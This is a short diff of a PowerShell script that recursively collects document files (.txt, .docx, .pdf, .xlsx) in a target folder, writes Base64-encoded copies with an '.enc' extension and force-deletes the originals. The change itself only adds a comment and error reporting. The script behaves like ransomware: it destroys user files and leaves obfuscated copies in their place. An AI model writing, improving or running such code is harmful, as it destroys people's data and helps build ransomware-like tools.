@@ -8,6 +8,10 @@ Get-ChildItem -Path $targetFolder -Recurse -Include *.txt,*.docx,*.pdf,*.xlsx -E
         $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))
         $newFile = "$($_.FullName).enc"
         [IO.File]::WriteAllText($newFile, $encoded)
+
+        # Attempt to remove the original file
         Remove-Item $_.FullName -Force
-    } catch {}
+    } catch {
+        Write-Host "Error processing file: $($_.FullName) - $_"
+    }
 }
